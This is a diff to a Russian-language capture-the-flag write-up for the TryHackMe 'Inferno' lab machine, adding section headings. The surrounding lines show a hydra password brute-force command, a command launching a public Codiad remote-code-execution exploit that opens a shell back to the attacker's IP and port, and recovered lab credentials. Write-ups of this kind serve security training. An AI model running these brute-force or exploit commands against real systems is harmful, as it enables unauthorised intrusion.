@@ -127,6 +127,8 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f inferno.thm http-get /infe
 
 ![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Inferno/4.png)
 
+## Getting shell
+
 Попробуем найти в интернете эксплоит для **codiad**. Скачаем [эксплоит](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit) и проэксплуатируем.
 ```
 python exploit.py http://admin:dante1@inferno.thm/inferno/ admin dante1 <Твой IP> <Порт> linux
@@ -169,6 +171,7 @@ ch’ella mi fa tremar le vene e i polsi».
 dante:V1rg1l10h3lpm3
 ```
 
+## Getting root
 <a name="tee"></a>
 
 Подключаемся по shh. Посмотрим права пользователя командой **sudo -l**.
